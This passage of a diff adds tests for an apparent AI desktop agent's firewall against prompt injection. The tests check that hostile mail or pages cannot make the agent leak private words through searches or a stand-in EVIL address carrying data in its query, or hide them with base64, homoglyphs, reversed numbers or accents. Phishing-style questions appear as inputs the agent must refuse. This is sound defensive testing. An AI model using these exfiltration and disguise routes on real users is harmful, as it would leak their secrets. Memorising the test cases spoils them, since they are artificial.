@@ -26,13 +26,14 @@ from pathlib import Path
 from typing import Any
 from urllib.parse import quote
 
+from briefing_reader import agent_ui
 from briefing_reader.actions import web_link_problem
 from briefing_reader.agent import firewall as fw
 from briefing_reader.agent import owner, tools, web, workspace
 from briefing_reader.ask.context import data
 from briefing_reader.desktop import backend as dbk
 from briefing_reader.desktop import executor as dx
-from briefing_reader.desktop import guard, results
+from briefing_reader.desktop import guard, results, routes
 from briefing_reader.desktop import validate as dv
 from briefing_reader.format_chars import drop_format, drop_invisible, has_invisible
 from tests.agent_fakes import FakePage
@@ -143,6 +144,18 @@ class SearchesFromOtherPeoplesWords(Corpus):
         self.assertEqual(bench.fetched, [])
         self.assertIn(f"Is {BODY_WORD} on sale?", bench.cards[-1])
 
+    def test_a_question_of_a_foreign_word_that_is_not_tainted_waits_too(self) -> None:
+        """rf-14: it hits nothing, so only a strict run's own rule can stop it; its address was seen."""
+        bench = self.bench(f"check {HOST}/deals")
+        self.read_hostile_mail(bench)
+        question = "Is the Dell on sale?"
+        self.assertEqual(bench.firewall.taint.hits(question), ())
+        self.assertTrue(bench.firewall.book.seen(RESULTS_LINK))
+        result = bench.call("fetch_text", url=RESULTS_LINK, question=question)
+        self.assertEqual(result.code, fw.WAITING)
+        self.assertEqual(bench.fetched, [])
+        self.assertIn(question, bench.cards[-1])
+
     def test_allow_clears_only_those_words_for_this_run(self) -> None:
         bench = self.bench()
         self.read_hostile_mail(bench)
@@ -167,11 +180,37 @@ class SearchesFromOtherPeoplesWords(Corpus):
         self.assertEqual(len(bench.cards), 1)
         self.assertEqual(bench.browser.loads, [])
 
-    def test_the_owners_own_message_clears_a_word(self) -> None:
+    def test_the_owners_later_message_clears_no_word_only_a_click_does(self) -> None:
         bench = self.bench()
         self.read_hostile_mail(bench)
         bench.owner_says(f"yes, and look up {BODY_WORD} on the web")
-        self.assertNotEqual(bench.call("web_search", query=BODY_WORD).code, fw.WAITING)
+        result = bench.call("web_search", query=BODY_WORD)
+        self.assert_no_call_but_a_card(bench, result, BODY_WORD)
+        bench.allow()
+        self.assertNotEqual(bench.call("web_search", query=BODY_WORD).code, fw.WAITING)   # that one call, and the word
+
+    def test_a_later_word_not_yet_tainted_stays_the_owners(self) -> None:
+        bench = self.bench()
+        bench.owner_says("and look at the Halberd invoice")   # before anything held it
+        bench.things.notes = ("The Halberd invoice is due.",)
+        bench.call("memory_read")
+        self.assertEqual(bench.firewall.taint.hits("Halberd"), ())
+        self.assertNotEqual(bench.call("web_search", query="Halberd prices").code, fw.WAITING)
+        self.assertEqual(bench.cards, [])
+
+    def test_a_later_word_said_while_the_run_holds_something_private_stays_the_owners_too(self) -> None:
+        bench = self.bench()
+        self.read_hostile_mail(bench)
+        bench.owner_says("and look at the Halberd invoice")   # it was not tainted when it was said
+        self.assertNotEqual(bench.call("web_search", query="Halberd invoice").code, fw.WAITING)
+        self.assertEqual(bench.cards, [])
+
+    def test_the_messages_still_reach_what_licenses(self) -> None:
+        bench = self.bench()
+        self.read_hostile_mail(bench)
+        bench.owner_says(f"open {BODY_WORD} and mute")
+        self.assertIn(f"open {BODY_WORD} and mute", bench.firewall.messages())
+        self.assertIn(f"open {BODY_WORD} and mute", bench.firewall.said())
 
 
 class AddressesFromOtherPeoplesWords(Corpus):
@@ -605,8 +644,8 @@ class NothingFedStillCounts(Corpus):
 
 
 class OneClickIsOneCall(Corpus):
-    """ars-2: an Allow, or the owner's words, that clear the last fragment leave the checks on; a declined call stays
-    declined whatever is cleared after."""
+    """ars-2: an Allow that clears the last fragment leaves the checks on; a declined call stays declined whatever is
+    cleared after, by a click or said. rf-1: words clear nothing, and a call whose card is up waits for that card."""
 
     ONLY = SECRET_WORD
 
@@ -640,12 +679,106 @@ class OneClickIsOneCall(Corpus):
         self.assertEqual(bench.call("open_page", url=address).code, fw.WAITING)
         bench.decline()
         self.assertEqual(bench.call("open_page", url=address).code, fw.DECLINED)
-        bench.owner_says(f"{self.ONLY} and Quillon")
-        self.assertFalse(bench.firewall.taint)
+        bench.owner_says(f"{self.ONLY} and Quillon, and open {address}")
+        self.assertTrue(bench.firewall.taint)
         result = bench.call("open_page", url=address)
         self.assertEqual(result.code, fw.DECLINED)
         self.assertEqual(len(bench.cards), 1)
         self.assertEqual(bench.browser.loads, [])
+
+    def test_a_declined_call_stays_declined_when_a_click_clears_its_words(self) -> None:
+        bench = self.holding_one_word()
+        declined = f"{self.ONLY} reviews"
+        self.assertEqual(bench.call("web_search", query=declined).code, fw.WAITING)
+        bench.decline()
+        other = f"{self.ONLY} prices"
+        self.assertEqual(bench.call("web_search", query=other).code, fw.WAITING)
+        bench.allow()                                                # clears the word
+        self.assertNotEqual(bench.call("web_search", query=other).code, fw.WAITING)
+        self.assertFalse(bench.firewall.taint)
+        self.assertEqual(bench.call("web_search", query=declined).code, fw.DECLINED)
+
+    def typed_at_the_card(self, bench: OwnerBench, tool: str, typed: str, **args: Any) -> None:
+        """The card is up, the owner types: the same call again sends nothing, and no second card comes. Its own Allow
+        then allows that one call."""
+        self.assertEqual(bench.call(tool, **args).code, fw.WAITING)
+        self.assertEqual(len(bench.cards), 1)
+        bench.owner_says(typed)
+        again = bench.call(tool, **args)
+        self.assertEqual(again.code, fw.CARD_BUSY)
+        self.assertEqual(again.text, fw.BUSY_TEXT)
+        self.assertEqual(len(bench.cards), 1)
+        self.assertEqual(bench.browser.loads, [])
+        bench.allow()
+        self.assertNotEqual(bench.call(tool, **args).code, fw.WAITING)
+        self.assertTrue(bench.browser.loads)
+        self.assertEqual(len(bench.cards), 1)
+
+    def test_words_at_a_search_card_send_nothing_whatever_they_say(self) -> None:
+        for typed in (f"no, don't search for {self.ONLY}", f"yes, search {self.ONLY} reviews", "Allow"):
+            with self.subTest(typed=typed):
+                self.typed_at_the_card(self.holding_one_word(), "web_search", typed, query=f"{self.ONLY} reviews")
+
+    def test_words_at_an_address_card_send_nothing_whatever_they_say(self) -> None:
+        address = f"{EVIL}?d=abc"
+        for typed in (f"no, don't open {address}", f"yes, open {address}"):
+            with self.subTest(typed=typed):
+                self.typed_at_the_card(self.holding_one_word(), "open_page", typed, url=address)
+
+    def test_one_allow_of_an_address_is_that_call_and_no_other(self) -> None:
+        bench = self.holding_one_word()
+        self.assertEqual(bench.call("open_page", url=f"{EVIL}?d=abc").code, fw.WAITING)
+        bench.owner_says(f"yes, open {EVIL}?d=abc")
+        bench.allow()
+        self.assertNotEqual(bench.call("open_page", url=f"{EVIL}?d=abc").code, fw.WAITING)
+        self.assertEqual(bench.call("open_page", url=f"{EVIL}?d=def").code, fw.WAITING)
+        self.assertEqual(len(bench.cards), 2)
+
+    def test_words_at_a_strict_run_s_card_send_nothing(self) -> None:
+        bench = self.bench()
+        self.read_hostile_mail(bench)
+        bench.browser.loads.clear()
+        query = f"{BODY_WORD} figures"
+        self.typed_at_the_card(bench, "web_search", f"I never said you could look up {BODY_WORD} figures", query=query)
+
+    def test_an_address_said_in_a_later_message_is_not_seen_once_the_run_holds_anything(self) -> None:
+        bench = self.holding_one_word()
+        address = f"{EVIL}?d=abc"
+        bench.owner_says(f"open {address}")
+        self.assertFalse(bench.firewall.book.seen(address))
+        self.assert_no_call_but_a_card(bench, bench.call("open_page", url=address), address)
+
+    def test_an_address_in_a_clean_run_s_words_counts_as_seen_for_good(self) -> None:
+        bench = self.bench(f"read {EVIL}?d=abc")
+        address = f"{EVIL}?d=abc"
+        bench.owner_says(f"and also {EVIL}?d=def")            # a clean run: as ever
+        bench.things.notes = ("Some note.",)
+        bench.call("memory_read")
+        self.assertTrue(bench.firewall.private)
+        self.assertTrue(bench.firewall.book.seen(address))
+        self.assertTrue(bench.firewall.book.seen(f"{EVIL}?d=def"))
+        self.assertNotEqual(bench.call("open_page", url=address).code, fw.WAITING)
+
+    def test_a_call_whose_card_is_up_waits_for_it_even_once_its_address_is_seen(self) -> None:
+        """The model reads a page that links the very address while its card is up: only the click answers it."""
+        bench = self.holding_one_word()
+        address = f"{EVIL}?d=abc"
+        self.assertEqual(bench.call("open_page", url=address).code, fw.WAITING)
+        bench.firewall.book.number(address)
+        self.assertTrue(bench.firewall.book.seen(address))
+        self.assertEqual(bench.call("open_page", url=address).code, fw.CARD_BUSY)
+        self.assertEqual(bench.browser.loads, [])
+        self.assertEqual(len(bench.cards), 1)
+
+    def test_a_pc_control_whose_card_is_up_waits_for_it_with_no_second_card(self) -> None:
+        bench = self.bench("compare the trading volume of three funds")
+        self.assertEqual(bench.call("pc_control", kind="volume", action="up").code, fw.WAITING)
+        self.assertEqual(bench.call("pc_control", kind="volume", action="up").code, fw.CARD_BUSY)
+        self.assertEqual(len(bench.cards), 1)
+        self.assertEqual(bench.things.pc_changes, [])
+        bench.allow()
+        self.assertFalse(bench.call("pc_control", kind="volume", action="up").is_error)
+        self.assertEqual(len(bench.things.pc_changes), 1)
 
     def test_a_declined_call_is_refused_in_a_run_of_any_kind(self) -> None:
         wall = fw.WebFirewall(web.AddressBook())
@@ -878,8 +1011,158 @@ class WordsInDisguise(Corpus):
         self.assertEqual(bench.call("web_search", query="S\u00F8ren Kierkegaard").code, fw.WAITING)
         clean = self.bench()
         self.assertNotEqual(clean.call("web_search", query="S\u00F8ren Kierkegaard").code, fw.WAITING)
-        accented = self.tainted()
-        self.assertNotEqual(accented.call("web_search", query="caf\u00E9 Z\u00FCrich").code, fw.WAITING)
+        accented = self.tainted()       # (rf-4: an accent the owner did not write takes one click too)
+        self.assertEqual(accented.call("web_search", query="caf\u00E9 Z\u00FCrich").code, fw.WAITING)
+
+    def test_a_number_reversed_or_with_a_zero_before_it_goes_to_the_card(self) -> None:
+        """rf-11: a note holds a locker code and a phone number; a page says to send them backwards or padded."""
+        for query in ("1284", "04821", "004821", "ref 41937", "073914", "7654321555", "7654-321-555"):
+            with self.subTest(query=query):
+                bench = self.bench()
+                bench.things.notes = ("Locker code 4821, ref 73914, ring 555-123-4567.",)
+                bench.call("memory_read")
+                self.assert_no_call_but_a_card(bench, bench.call("web_search", query=query), query)
+
+    def test_a_short_word_or_number_in_base64_goes_to_the_card(self) -> None:
+        for text in ("Gina", "4821", "Bob7"):
+            for query in (base64.b64encode(text.encode()).decode(), base64.b64encode(text.encode()).decode().rstrip("=")):
+                with self.subTest(query=query):
+                    bench = self.bench()
+                    bench.things.notes = ("Ring Gina about locker 4821, or Bob7.",)
+                    bench.call("memory_read")
+                    self.assert_no_call_but_a_card(bench, bench.call("web_search", query=query), query)
+
+    def test_plain_words_that_read_as_base64_stay_plain(self) -> None:
+        """Short tokens are read only to be compared with what the run holds: "bill" reads as "n)e", which is nobody's
+        word, and a strict run's rule must not count it as one."""
+        self.assertEqual(fw.encoded_forms("bill"), [])
+        self.assertEqual(fw.encoded_forms("bill", 4), ["n)e"])
+        bench = self.bench("compare the bill")
+        self.read_hostile_mail(bench)
+        self.assertNotEqual(bench.call("web_search", query="the bill").code, fw.WAITING)
+        self.assertEqual(bench.cards, [])
+
+
+class HowAWordIsWritten(Corpus):
+    """rf-4: how a word is written counts as well as how it folds, in any run that holds anything private: accents and
+    marks are no way to carry something on a word that reads as the owner's."""
+
+    # (rf-4's table: each goes exactly as it did, with its words in the owner's goal.)
+    ORDINARY = ("C++ tutorial", "node.js vs deno", "what's the best laptop?", "well-known", "U.S. visa (tourist)",
+                "$5 gift", "50%", "3.5mm jack", "wi-fi 6e", "AT&T", "O'Brien's", "R&D", "laptops.",
+                "compare laptops, please")
+    # Plain writing of what a model searches for: in a run that is not strict it goes with no word of it the owner's.
+    PLAIN = ("best laptop site:reddit.com", "state-of-the-art laptops", "2026-11-06", "v1.2.3", "www.example.com",
+             "The-Lord-of-the-Rings", '"quiet laptops"', '"quiet" laptops', "(2026)", "laptops (2026).", '"quiet",',
+             "$1,450.25", "14:30", "1,000,000", "foo_bar_baz", "\u00A3500 laptops", "\u20AC100 headphones",
+             "rock'n'roll", "e.g. laptops", "laptop\u2019s battery", "\u201Cquiet laptops\u201D", "laptops \u2013 2026",
+             "24/7 support", "and/or", "-windows laptops", "+quiet laptops", "C# guide", "$100-$500 laptops",
+             "\u00A3100-\u00A3500 laptops", "10%-20% off", "Acme Inc., reviews", "U.S., visa", "(see above),")
+    # What folds to a word the owner said, or writes something beside it (the review's proofs).
+    COMBINING = "".join(chr(0x0300 + offset) for offset in (17, 1, 53, 1, 41, 1, 44, 1, 44, 1))
+    CARRIES = ("laptops" + COMBINING, "laptops--.-..-..--.-..-.-", "laptops--.- laptops..- laptops.. laptops.-..",
+               "laptops.,.,,.,.,,,.", "laptops\u3001\u3002\u3001\u3001\u3002\u3002\u3001\u3002", "laptops()[]{}()[]{}",
+               "--.- ..- .. .-.. .-..", "l\u00E0pt\u00F3ps", "l\u0430pt\u043Eps",
+               "\uFF4C\uFF41\uFF50\uFF54\uFF4F\uFF50\uFF53",
+               "laptops \U0001F600", "laptops\u2026", "\u0664\u0668\u0662\u0661")
+
+    def holding(self, bench: OwnerBench, strict: bool) -> OwnerBench:
+        if strict:
+            self.read_hostile_mail(bench)
+        else:
+            bench.things.notes = ("Dinner with Quillon.",)
+            bench.call("memory_read")
+            self.assertTrue(bench.firewall.private)
+            self.assertFalse(bench.firewall.strict)
+        bench.browser.loads.clear()
+        return bench
+
+    def test_ordinary_queries_go_exactly_as_they_did(self) -> None:
+        for strict in (False, True):
+            for query in self.ORDINARY:
+                with self.subTest(query=query, strict=strict):
+                    bench = self.holding(self.bench(query), strict)
+                    self.assertNotEqual(bench.call("web_search", query=query).code, fw.WAITING)
+                    self.assertEqual(bench.cards, [])
+                    self.assertEqual(bench.browser.loads[0], web.ENGINES[0].url(query))
+
+    def test_plain_writing_goes_in_a_run_that_is_not_strict(self) -> None:
+        for query in self.PLAIN:
+            with self.subTest(query=query):
+                bench = self.holding(self.bench("compare cheap laptops"), False)
+                self.assertNotEqual(bench.call("web_search", query=query).code, fw.WAITING)
+                self.assertEqual(bench.cards, [])
+                self.assertEqual(bench.browser.loads[0], web.ENGINES[0].url(query))
+
+    def test_what_folds_to_the_owners_word_goes_to_the_card(self) -> None:
+        for strict in (False, True):
+            for query in self.CARRIES:
+                with self.subTest(query=query, strict=strict):
+                    bench = self.holding(self.bench("compare laptops"), strict)
+                    result = bench.call("web_search", query=query)
+                    self.assert_no_call_but_a_card(bench, result, query)
+
+    def test_a_question_to_fetch_text_is_held_to_the_same(self) -> None:
+        for strict in (False, True):
+            for question in ("laptops--.-..-", "l\u00E0pt\u00F3ps"):
+                with self.subTest(question=question, strict=strict):
+                    bench = self.bench(f"compare laptops on {RESULTS_LINK}")
+                    self.holding(bench, strict)
+                    self.assertEqual(bench.call("fetch_text", url=RESULTS_LINK, question=question).code, fw.WAITING)
+                    self.assertEqual(bench.fetched, [])
+
+    def test_a_foreign_language_query_the_owner_spelled_goes(self) -> None:
+        for strict in (False, True):
+            for goal, query in (("find a caf\u00E9 in Z\u00FCrich", "caf\u00E9 Z\u00FCrich"),
+                                ("find a caf\u00E9 in Z\u00FCrich", "CAF\u00C9 Z\u00DCRICH"),
+                                ("find a caf\u00E9 in Z\u00FCrich", "cafe\u0301 Zu\u0308rich"),   # the same, composed apart
+                                ("find a cafe\u0301", "caf\u00E9"),
+                                ("read S\u00F8ren Kierkegaard", "S\u00F8ren Kierkegaard"),
+                                ("\u6771\u4EAC \u30DB\u30C6\u30EB", "\u6771\u4EAC \u30DB\u30C6\u30EB")):
+                with self.subTest(goal=goal, query=query, strict=strict):
+                    bench = self.holding(self.bench(goal), strict)
+                    self.assertNotEqual(bench.call("web_search", query=query).code, fw.WAITING)
+                    self.assertEqual(bench.cards, [])
+
+    def test_a_foreign_language_query_they_did_not_spell_takes_one_click(self) -> None:
+        for goal, query in (("find a cafe in Zurich", "caf\u00E9 Z\u00FCrich"),
+                            ("find a hotel", "\u6771\u4EAC \u30DB\u30C6\u30EB"),
+                            ("find a caf\u00E9", "caf\u00E8")):
+            with self.subTest(goal=goal, query=query):
+                bench = self.holding(self.bench(goal), False)
+                self.assert_no_call_but_a_card(bench, bench.call("web_search", query=query), query)
+                bench.allow()
+                self.assertNotEqual(bench.call("web_search", query=query).code, fw.WAITING)
+                self.assertTrue(bench.browser.loads)
+                self.assertEqual(len(bench.cards), 1)
+                # That click clears those words as they were written, for the run, as any Allow clears its words:
+                self.assertNotEqual(bench.call("web_search", query=f"{query} prices").code, fw.WAITING)
+                self.assertEqual(len(bench.cards), 1)
+
+    def test_one_allow_clears_only_what_it_showed_as_it_was_written(self) -> None:
+        bench = self.holding(self.bench("compare laptops"), False)
+        self.assertEqual(bench.call("web_search", query="l\u00E0ptops--.-").code, fw.WAITING)
+        bench.allow()
+        self.assertNotEqual(bench.call("web_search", query="l\u00E0ptops--.-").code, fw.WAITING)
+        for other in ("l\u00E1ptops", "laptops-..-"):
+            with self.subTest(other=other):
+                self.assertEqual(bench.call("web_search", query=other).code, fw.WAITING)
+                bench.decline()
+
+    def test_a_clean_run_is_not_looked_at(self) -> None:
+        for query in self.CARRIES:
+            with self.subTest(query=query):
+                bench = self.bench("compare laptops")
+                self.assertNotEqual(bench.call("web_search", query=query).code, fw.WAITING)
+                self.assertEqual(bench.cards, [])
+
+    def test_the_owners_own_marks_are_theirs_in_any_run(self) -> None:
+        for strict in (False, True):
+            for query in ("std::vector tutorial", "wait...", "C++, Rust"):
+                with self.subTest(query=query, strict=strict):
+                    bench = self.holding(self.bench(query), strict)
+                    self.assertNotEqual(bench.call("web_search", query=query).code, fw.WAITING)
+                    self.assertEqual(bench.cards, [])
 
 
 class TextThatFreezesTheApp(Corpus):
@@ -894,10 +1177,10 @@ class TextThatFreezesTheApp(Corpus):
               "tabs": ("\t" * 2_000 + "x\n") * 200, "selectors": "\uFE00" * 50_000, "tags": "\U000E0041" * 50_000,
               "base64": "QUJD" * 25_000}
 
-    def timed(self, what: str, work: Any) -> Any:
+    def timed(self, what: str, work: Any, budget: float = 0.0) -> Any:
         began = time.thread_time()
         result = work()
-        self.assertLess(time.thread_time() - began, self.BUDGET_S, what)
+        self.assertLess(time.thread_time() - began, budget or self.BUDGET_S, what)
         return result
 
     def test_a_private_text_of_a_at_a_at(self) -> None:
@@ -932,6 +1215,49 @@ class TextThatFreezesTheApp(Corpus):
         ref = next(row.split()[0] for row in found.text.splitlines() if "at.txt" in row)
         self.assertFalse(self.timed("file_read", lambda: bench.call("file_read", ref=ref)).is_error)
 
+    def test_a_paste_with_a_run_of_marks_through_the_real_tools(self) -> None:
+        """rf-2: the bar takes 32,767 characters. A pasted text's run of marks in the owner's words: every tool that reads
+        them for a licence stays within the budget. A paste of many words takes longer, word by word, but that is Python's
+        pace, with the GIL let go between them (the review's freeze was one pattern's match, with nothing else running)."""
+        for name, paste, budget in (("dots", "." * 32_700 + "x", self.BUDGET_S),
+                                    ("marks", ".,;:!?" * 5_450 + "x", self.BUDGET_S),
+                                    ("a bit", " a bit" * 5_450, 5.0), ("please", " please" * 4_670, 5.0),
+                                    ("and", " and" * 8_170, 5.0), ("then", "a then " * 4_670, 5.0),
+                                    ("mute", "mute. " * 5_450, 5.0), ("no then mute", "no then mute " * 2_500, 5.0)):
+            with self.subTest(paste=name):
+                bench = self.bench(("move my letter, summarise this: " + paste)[:32_767])
+                bench.call("files_list")
+                down = bench.call("files_list", place="Downloads")
+                ref = next(row.split()[0] for row in down.text.splitlines() if "letter" in row)
+                self.timed("pc_control", lambda: bench.call("pc_control", kind="media", action="pause"), budget)
+                self.timed("pc_control", lambda: bench.call("pc_control", kind="timer", minutes=5), budget)
+                self.timed("open_thing", lambda: bench.call("open_thing", ref=ref), budget)
+                self.timed("propose_files", lambda: bench.call("propose_files", steps=[{"skill": "recycle_files",
+                                                                                         "files": [ref]}]), budget)
+
+    def test_every_pattern_the_paste_goes_through(self) -> None:
+        for name, text in (("dots", "." * 32_767), ("marks", ".,;:!?" * 5_461), ("a bit", " a bit" * 5_461),
+                           ("a bit, then a word", " a bit" * 5_460 + " x"),   # one clause: CLAUSE_CAP keeps it from _TAIL_RE
+                           ("no then mute", "no then mute " * 2_520), ("mute", "mute. " * 5_461)):
+            for what, work in (("_pc_asks", lambda: owner._pc_asks(text)),      # noqa: SLF001
+                               ("taken_back", lambda: dv.taken_back(text)),
+                               ("licensed_skills", lambda: dv.licensed_skills(text)),
+                               ("withdrawn_skills", lambda: dv.withdrawn_skills(["x", text])),
+                               ("oddly_written", lambda: fw.TaintSet().oddly_written(text))):
+                with self.subTest(input=name, function=what):
+                    self.timed(f"{what} on {name}", work)
+
+    def test_the_patterns_cut_ordinary_text_as_they_did(self) -> None:
+        old_clause = re.compile(r"[.,;:!?]+(?:\s+|$)|\s+(?:and then|and|then|but|also|after that|afterwards)\s+",
+                                re.IGNORECASE)
+        old_break = re.compile(r"(?<!\d),|,(?!\d)|;|[.!?]+(?=\s|$)")
+        for text in ("mute. Then pause, please!", "a..b.. c... d?! e", "essay.docx, 1,000 and 3.5; done.", "wait... what?",
+                     "x ... y", "...", ".. ..", "one,two, three", "and then and also", "Is it? Yes! No.", "a!b!c! d"):
+            with self.subTest(text=text):
+                self.assertEqual(owner._CLAUSE_RE.split(text), old_clause.split(text))   # noqa: SLF001
+                self.assertEqual([found.span() for found in dv._BREAK_RE.finditer(text)],  # noqa: SLF001
+                                 [found.span() for found in old_break.finditer(text)])
+
     def test_every_pattern_on_every_hostile_input(self) -> None:
         held = fw.TaintSet()
         held.add(["Zephyrine Quillfeather 5551234567 ana@example.org 4821"])
@@ -940,6 +1266,7 @@ class TextThatFreezesTheApp(Corpus):
             for what, work in (
                     ("add", lambda: fw.TaintSet().add([text])), ("note_owner", lambda: fw.TaintSet().note_owner(text)),
                     ("hits", lambda: held.hits(text)), ("foreign", lambda: held.foreign(text)),
+                    ("oddly_written", lambda: held.oddly_written(text)),
                     ("split_hits", lambda: held.split_hits(text, ["ab"] * 8)),
                     ("pieced_hits", lambda: held.pieced_hits(text, [("ab", "cd")] * 8)),
                     ("looks_encoded", lambda: fw.looks_encoded(text)),
@@ -1067,6 +1394,28 @@ class OtherPeoplesWordsInJarvissVoice(Corpus):
         self.assert_refused(bench.call("say", text=self.SAID))
         self.assertEqual(bench.spoken, [])
 
+    def test_a_question_s_choice_may_not_repeat_a_pages_words(self) -> None:
+        """rf-14: the question is the model's own; the choice is not."""
+        bench = self.after_page()
+        result = bench.call("ask_owner", question="Which shall it be?", choices=[self.SAID[:60], "None of them"])
+        self.assert_refused(result)
+        self.assertEqual(bench.asked, [])
+
+    def test_a_search_result_s_words_may_not_be_repeated(self) -> None:
+        query = "quiet laptops"
+        bench = self.bench(f"look up {query}", pages={web.ENGINES[0].url(query): FakePage(
+            results=[("A shop", "https://shop.example.org/one", self.SAID)])})
+        self.assertFalse(bench.call("web_search", query=query).is_error)
+        self.assert_refused(bench.call("say", text=self.SAID))
+
+    def test_what_read_more_gave_may_not_be_repeated(self) -> None:
+        site = self.SITE
+        bench = self.bench(f"summarise {site}", pages={site: FakePage("A shop", "Plain words go here. " * 1000 + self.SAID)})
+        self.assertFalse(bench.call("open_page", url=site).is_error)
+        self.assertEqual(bench.call("say", text=self.SAID).text, "Said.")   # it has not read that far
+        self.assertFalse(bench.call("read_more").is_error)
+        self.assert_refused(bench.call("say", text=self.SAID))
+
     def test_a_question_refuses_them(self) -> None:
         bench = self.after_page()
         self.assert_refused(bench.call("ask_owner", question=f"Shall I? {self.SAID}"[:300]))
@@ -1157,6 +1506,19 @@ class QuestionsThatPhish(Corpus):
                 self.assertIn("never asks the owner for a password", result.text)
                 self.assertEqual(bench.asked, [])
 
+    def test_the_everyday_ways_of_asking_are_refused(self) -> None:
+        """rf-3: none of these says a password, a code or a card number."""
+        for question in ("What is the 6 digit number we just texted you?",
+                         "Please type the number from your authenticator app.",
+                         "What's the 16 digit number on your card?", "What's your mother's maiden name?",
+                         "Type the characters from your memorable word.", "Type your pass word.",
+                         "To continue, reply with the digits we sent you.", "What is your date of birth?",
+                         "What's the number we sent?"):
+            with self.subTest(question=question):
+                bench = self.bench()
+                self.assertEqual(bench.call("ask_owner", question=question).code, tools.ASKS_SECRET)
+                self.assertEqual(bench.asked, [])
+
     def test_a_choice_for_a_secret_is_refused(self) -> None:
         bench = self.bench()
         result = bench.call("ask_owner", question="How shall I go on?", choices=["Type my password", "Stop"])
@@ -1201,8 +1563,8 @@ class KeywordsAreNotRequests(Corpus):
 
     def test_the_owners_request_acts_at_once(self) -> None:
         for goal, args in (("turn the volume down", {"kind": "volume", "action": "down", "step": 5}),
-                           ("compare three laptops and turn the volume down a bit", {"kind": "volume", "action": "down",
-                                                                                     "step": 5}),
+                           ("compare three laptops, then turn the volume down a bit", {"kind": "volume", "action": "down",
+                                                                                       "step": 5}),
                            ("volume 30", {"kind": "volume", "action": "set", "level": 30}),
                            ("set the volume to 30 and then read my notes",
                             {"kind": "volume", "action": "set", "level": 30}),
@@ -1217,6 +1579,16 @@ class KeywordsAreNotRequests(Corpus):
                 self.assertFalse(result.is_error, result.text)
                 self.assertEqual(bench.cards, [])
                 self.assertEqual(len(bench.things.pc_changes), 1)
+
+    def test_the_owners_request_stands_for_itself_alone(self) -> None:
+        """rf-14: asking for the volume asks for no screenshot, timer or focus mode."""
+        for args in ({"kind": "screenshot"}, {"kind": "timer", "minutes": 5}, {"kind": "focus_mode", "minutes": 30},
+                     {"kind": "media", "action": "pause"}, {"kind": "cancel_timer"}):
+            with self.subTest(args=args):
+                bench = self.bench("turn the volume up")
+                self.assertEqual(bench.call("pc_control", **args).code, dv.INTENT_NOT_LICENSED)
+                self.assertEqual(bench.things.pc_changes, [])
+                self.assertEqual(bench.cards, [])
 
     def test_the_other_direction_or_another_level_goes_on_a_card(self) -> None:
         for goal, args in (("turn the volume down", {"kind": "volume", "action": "up", "step": 5}),
@@ -1249,6 +1621,176 @@ class KeywordsAreNotRequests(Corpus):
         bench = self.bench("compare the trading volume of three funds")
         result = bench.call("pc_control", kind="volume", action="set", level=100)
         self.assertIn("End your turn", result.text)
+
+    def how(self, goal: str, *later: str, **args: Any) -> str:
+        """What the real tool does with the model's pc_control after the owner's words: at once, a card or a refusal."""
+        bench = self.bench(goal)
+        for words in later:
+            bench.owner_says(words)
+        result = bench.call("pc_control", **args)
+        if bench.things.pc_changes:
+            self.assertEqual(bench.cards, [])
+            return "at once"
+        if bench.cards:
+            self.assertEqual(result.code, fw.WAITING)
+            return "card"
+        self.assertEqual(result.code, dv.INTENT_NOT_LICENSED)
+        return "refused"
+
+    # rf-5: a chain from the start of the message. Every row of the review's probes (pc_acts.py, pc_words.py).
+    PAUSE, NEXT = {"kind": "media", "action": "pause"}, {"kind": "media", "action": "next"}
+    PREVIOUS, PLAY = {"kind": "media", "action": "previous"}, {"kind": "media", "action": "play"}
+    MUTE, UP = {"kind": "volume", "action": "mute"}, {"kind": "volume", "action": "up"}
+    DOWN, SHOT = {"kind": "volume", "action": "down"}, {"kind": "screenshot"}
+    NOT_REQUESTS = (("compare the play, pause and next buttons on these three remotes", PAUSE, "card"),
+                    ("compare the play, pause and next buttons", PAUSE, "card"),
+                    ("Compare these headsets on price, comfort, volume up, mute and battery", MUTE, "card"),
+                    ("Which app should I use: Spotify, Tidal, or Deezer? Compare next, previous and shuffle", NEXT, "card"),
+                    ("write me a guide to remote buttons: play, pause, next, previous", PREVIOUS, "card"),
+                    ("what do these words mean in a podcast app: skip, resume, mute", MUTE, "card"),
+                    ("these words: skip, resume, mute", MUTE, "card"),
+                    ("compare the trading volume of three funds", UP, "card"),
+                    ("explain what happens when I press mute and then play", PLAY, "card"),
+                    ("Never mute and pause.", PAUSE, "refused"),
+                    ("don't mute, pause", PAUSE, "refused"),
+                    ("do not stop the music and pause", PAUSE, "refused"),
+                    ("don't mute, then pause", PAUSE, "refused"),
+                    ("never mind the report, then mute", MUTE, "card"),
+                    ("if it gets loud then mute", MUTE, "card"),
+                    ("tell me if it is quieter and louder", UP, "card"),
+                    ("find the best screenshot tool and a timer for 5 minutes app", {"kind": "timer", "minutes": 5}, "card"),
+                    ("I'd like a report on these: screenshot, screen grab", SHOT, "card"),
+                    ("should I set the volume to 50? tell me why, and volume 50", {"kind": "volume", "action": "set",
+                                                                                   "level": 50}, "card"),
+                    ("Research laptops and pause the music", PAUSE, "card"),
+                    ("find the report and mute", MUTE, "card"),
+                    ("find the report, then mute and pause", PAUSE, "card"),
+                    ("Next, compare these laptops", NEXT, "card"))
+    REQUESTS = (("mute and pause", MUTE), ("mute and pause", PAUSE),
+                ("turn the volume up and take a screenshot", UP), ("turn the volume up and take a screenshot", SHOT),
+                ("find the report, then mute", MUTE), ("find the report, and then mute", MUTE),
+                ("find the report then mute", MUTE), ("find the report. Then mute.", MUTE),
+                ("find the report, after that mute", MUTE), ("find the report. After that, mute.", MUTE),
+                ("find the report, next mute", MUTE), ("find the report. Next, mute.", MUTE),
+                ("find the report, then, mute", MUTE), ("find the report, afterwards mute", MUTE),
+                ("Jarvis, mute.", MUTE), ("please mute", MUTE), ("can you mute please", MUTE), ("mute, please", MUTE),
+                ("okay, mute, thanks", MUTE), ("mute, then find the report", MUTE), ("next", NEXT), ("next, please", NEXT),
+                ("find the report, then next song", NEXT), ("Research laptops, and then turn the volume down a bit.", DOWN),
+                # The review's table of plain requests, as the routes have them:
+                ("turn the volume down", DOWN), ("turn it down", DOWN), ("unmute", {"kind": "volume", "action": "unmute"}),
+                ("set the volume to 40", {"kind": "volume", "action": "set", "level": 40}),
+                ("pause the music", PAUSE), ("play music", PLAY), ("next song", NEXT),
+                ("set a timer for 10 minutes", {"kind": "timer", "minutes": 10}),
+                ("timer 10 minutes", {"kind": "timer", "minutes": 10}),
+                ("remind me in 10 minutes", {"kind": "timer", "minutes": 10}),
